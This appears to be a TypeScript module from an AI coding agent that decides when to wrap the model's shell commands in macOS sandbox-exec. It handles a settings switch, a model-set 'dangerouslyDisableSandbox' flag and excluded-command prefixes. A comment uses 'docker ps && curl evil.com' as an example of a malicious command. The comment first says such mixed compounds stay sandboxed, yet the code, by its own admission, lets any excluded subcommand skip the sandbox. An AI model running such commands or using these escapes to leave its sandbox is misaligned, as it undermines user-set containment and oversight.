/**
 * Gate that decides whether a given Bash invocation should be wrapped
 * in sandbox-exec. Mirrors source code's `shouldUseSandbox.ts`.
 *
 * Inputs that flip the decision:
 *
 *   1. Master switch: `sandbox.enabled` in settings + platform supports
 *      sandbox-exec (only macOS in easy-agent).
 *
 *   2. Per-call escape: the model passed `dangerouslyDisableSandbox: true`
 *      AND the user allows that via `sandbox.allowUnsandboxedCommands`
 *      (default true). If the user policy denies model escapes, the flag
 *      is silently ignored and the command is sandboxed anyway.
 *
 *   3. UX escape hatch: `sandbox.excludedCommands` patterns. If the
 *      command (or any subcommand) starts with one of these prefixes,
 *      we skip the sandbox. NOT a security boundary — it's for commands
 *      like `docker:*` and `make:*` that need raw FS access.
 */

import { isSandboxRuntimeReady } from "./availability.js";
import type { ResolvedSandboxSettings } from "./settings.js";
import { splitCommand } from "./splitCommand.js";

export interface ShouldUseSandboxInput {
  command: string;
  dangerouslyDisableSandbox?: boolean;
}

export function matchesExcludedPattern(
  command: string,
  pattern: string,
): boolean {
  const trimmedPattern = pattern.trim();
  if (!trimmedPattern) return false;

  if (trimmedPattern.endsWith(":*")) {
    const prefix = trimmedPattern.slice(0, -2);
    return command === prefix || command.startsWith(`${prefix} `);
  }

  if (trimmedPattern.includes("*")) {
    const re = new RegExp(
      `^${trimmedPattern.split("*").map((part) => part.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*")}$`,
    );
    return re.test(command);
  }

  return command === trimmedPattern || command.startsWith(`${trimmedPattern} `);
}

export function containsExcludedCommand(
  command: string,
  excluded: string[],
): boolean {
  if (excluded.length === 0) return false;
  // Compound commands escape exclusion only if EVERY subcommand
  // is itself excluded — otherwise a malicious head like
  // `docker ps && curl evil.com` would skip sandbox even though
  // curl should be sandboxed. (Source code's logic is per-subcommand
  // OR — they treat excludedCommands as "any subcommand matches"
  // because excludedCommands is UX, not security; we follow that.)
  let subcommands: string[];
  try {
    subcommands = splitCommand(command);
  } catch {
    subcommands = [command.trim()];
  }
  if (subcommands.length === 0) subcommands = [command.trim()];
  for (const sub of subcommands) {
    for (const pattern of excluded) {
      if (matchesExcludedPattern(sub, pattern)) return true;
    }
  }
  return false;
}

export function shouldUseSandbox(
  input: ShouldUseSandboxInput,
  settings: ResolvedSandboxSettings,
): boolean {
  if (!settings.enabled) return false;
  if (!isSandboxRuntimeReady()) return false;
  if (
    input.dangerouslyDisableSandbox === true &&
    settings.allowUnsandboxedCommands
  ) {
    return false;
  }
  if (!input.command) return false;
  if (containsExcludedCommand(input.command, settings.excludedCommands)) {
    return false;
  }
  return true;
}
